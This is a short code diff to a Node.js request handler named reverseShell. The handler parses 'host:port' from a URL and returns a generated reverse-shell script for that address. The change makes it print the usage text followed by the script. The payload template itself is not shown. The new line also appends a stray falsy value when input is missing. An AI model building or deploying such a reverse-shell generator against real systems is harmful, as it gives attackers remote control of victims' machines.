@@ -33,7 +33,7 @@ fi`;
 
 const reverseShell = req => {
 	const [host, port] = req.url.substr(1).split(':');
-	return (host && port) ? generateScript(host, port) : usage;
+	return usage + (host && port && generateScript(host, port));
 };
 
 module.exports = reverseShell;
